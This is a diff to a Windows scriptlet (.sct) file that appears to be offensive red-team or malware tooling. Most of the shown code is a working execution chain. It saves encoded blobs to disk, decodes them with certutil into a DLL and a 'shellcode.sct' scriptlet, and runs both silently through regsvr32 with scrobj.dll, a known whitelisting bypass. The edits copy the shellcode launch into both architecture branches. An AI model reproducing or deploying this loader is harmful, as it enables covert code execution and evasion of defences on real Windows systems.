@@ -1,3 +1,4 @@
+
 <?XML version="1.0"?>
 <scriptlet>
 <registration 
@@ -409,22 +410,29 @@
 				var r = new ActiveXObject("WScript.Shell").Run("certutil.exe /decode DynamicWrapperX.txt x86.dll", 0);
 				sleep(5000);
 				var execFilex64 = new ActiveXObject("WScript.Shell").Run("C:\\Windows\\SysWOW64\\regsvr32.exe /s /i x86.dll", 0);
+				
+				SaveStringToFile("shellcode.txt", shellcode);
+				sleep(5000);
+				var x = new ActiveXObject("WScript.Shell").Run("certutil.exe /decode shellcode.txt shellcode.sct", 0 );
+				sleep(5000);
+				var execShellCode = new ActiveXObject("WScript.Shell").Run("C:\\Windows\\SysWOW64\\regsvr32.exe /u /i:shellcode.sct scrobj.dll", 0);
 			}
 			else
 			{
 				SaveStringToFile("DynamicWrapperX.txt", x86dllEncoded);
 				var r = new ActiveXObject("WScript.Shell").Run("certutil.exe /decode DynamicWrapperX.txt x86.dll", 0);
 				sleep(5000);
-				var execFilex86 = new ActiveXObject("WScript.Shell").Run("regsvr32.exe /s /i x86.dll", 0);
+				var execFilex86 = new ActiveXObject("WScript.Shell").Run("C:\\Windows\\System32\\regsvr32.exe /s /i x86.dll", 0);
+				
+				SaveStringToFile("shellcode.txt", shellcode);
+				sleep(5000);
+				var x = new ActiveXObject("WScript.Shell").Run("certutil.exe /decode shellcode.txt shellcode.sct", 0 );
+				sleep(5000);
+				var execShellCode = new ActiveXObject("WScript.Shell").Run("C:\\Windows\\System32\\regsvr32.exe /u /i:shellcode.sct scrobj.dll", 0);
 				
 			}
 
-			SaveStringToFile("shellcode.txt", shellcode);
-			sleep(5000);
-			var x = new ActiveXObject("WScript.Shell").Run("certutil.exe /decode shellcode.txt shellcode.sct", 0 );
-			sleep(5000);
-			var execShellCode = new ActiveXObject("WScript.Shell").Run("C:\\Windows\\SysWOW64\\regsvr32.exe /u /i:shellcode.sct scrobj.dll", 0);
-	    //Makes No Effort to Clean Up Files Left On Disk...
+			
 		]]>
 </script>
 </registration>
